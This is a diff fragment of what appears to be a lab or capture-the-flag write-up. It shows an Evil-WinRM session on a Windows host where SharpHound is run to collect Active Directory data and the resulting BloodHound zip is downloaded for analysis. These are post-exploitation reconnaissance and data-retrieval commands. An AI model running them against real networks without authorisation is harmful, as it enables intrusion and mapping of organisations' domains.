@@ -371,5 +371,16 @@ Mode                LastWriteTime         Length Name
 
 
 *Evil-WinRM* PS C:\Users\oliver\Desktop> .\SharpHound.exe -c All
-
 ```
+This uploaded and ran sharphound
+
+```python
+*Evil-WinRM* PS C:\Users\oliver\Desktop> download 20260421075942_BloodHound.zip
+                                        
+Info: Downloading C:\Users\oliver\Desktop\20260421075942_BloodHound.zip to 20260421075942_BloodHound.zip
+                                        
+Info: Download successful!
+```
+I now have the data i can upload it to bloodhound
+
+# Bloodhound
